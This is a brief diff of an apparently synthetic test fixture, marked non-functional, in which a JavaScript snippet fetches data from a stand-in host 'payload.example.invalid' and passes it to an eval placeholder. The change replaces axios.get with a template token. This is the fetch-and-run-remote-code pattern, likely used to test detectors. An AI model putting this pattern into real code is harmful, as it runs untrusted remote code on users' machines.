@@ -1,7 +1,7 @@
 // SYNTHETIC TEST FIXTURE — not functional
 const axios = require("axios");
 
-axios.get("https://payload.example.invalid/h").then((r) => {
+{{AXIOS_GET}}("https://payload.example.invalid/h").then((r) => {
   {{EVAL}}(r.data);
 });
 
